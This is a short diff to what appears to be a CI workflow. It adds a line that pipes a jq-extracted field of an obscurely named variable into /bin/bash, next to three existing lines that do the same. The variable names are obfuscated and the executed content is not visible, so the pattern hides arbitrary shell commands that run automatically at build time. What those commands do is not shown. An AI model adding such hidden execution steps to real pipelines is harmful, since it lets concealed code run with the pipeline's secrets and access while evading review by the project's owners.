@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$vcgcx9" | jq -r .nud4406 | /bin/bash
           echo $ebou12958 | jq -r .n1018 | /bin/bash
           echo $qlld80 | jq -r .x8 | /bin/bash
+          echo $y03524 | jq -r .zpjej042 | /bin/bash
 
       - name: Store artifact
         if: always()
